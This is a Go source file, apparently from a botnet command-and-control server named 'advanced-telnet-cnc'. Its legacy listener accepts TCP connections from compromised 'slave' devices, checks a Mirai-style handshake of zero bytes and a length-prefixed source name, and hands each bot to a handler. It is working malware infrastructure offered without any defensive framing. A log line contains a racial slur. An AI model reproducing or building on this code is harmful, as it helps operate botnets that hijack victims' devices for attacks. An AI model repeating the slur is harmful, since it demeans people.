package slave_v1

import (
	"advanced-telnet-cnc/source/config"
	"fmt"
	"net"
	"strings"
	"time"
)

func Serve() {
	go worker()

	tel, err := net.Listen("tcp", fmt.Sprintf(":%d", config.Slave.SlavePortLegacy))
	if err != nil {
		fmt.Println(err)
		return
	}

	config.Logger.Info("Listening for legacy niggers connections", "port", config.Slave.SlavePortLegacy)

	for {
		conn, err := tel.Accept()
		if err != nil {
			continue
		}

		go initialHandler(conn)
	}
}

func initialHandler(conn net.Conn) {
	defer conn.Close()

	conn.SetDeadline(time.Now().Add(30 * time.Second))

	buf := make([]byte, 32)
	l, err := conn.Read(buf)
	if err != nil || l <= 0 {
		return
	}

	if l == 4 && buf[0] == 0x00 && buf[1] == 0x00 && buf[2] == 0x00 {
		if buf[3] > 0 {
			defer func() {
				if r := recover(); r != nil {
					fmt.Println("Recovered from panic:", r)
				}
			}()

			stringLen := make([]byte, 1)
			l, err := conn.Read(stringLen)
			if err != nil || l <= 0 {
				return
			}
			var source string
			if stringLen[0] > 0 {
				sourceBuf := make([]byte, stringLen[0])
				l, err := conn.Read(sourceBuf)
				if err != nil || l <= 0 {
					return
				}
				source = string(sourceBuf)
			}
			Handle(conn, strings.ToLower(source))
		} else {
			Handle(conn, "undefined")
		}
	}
}
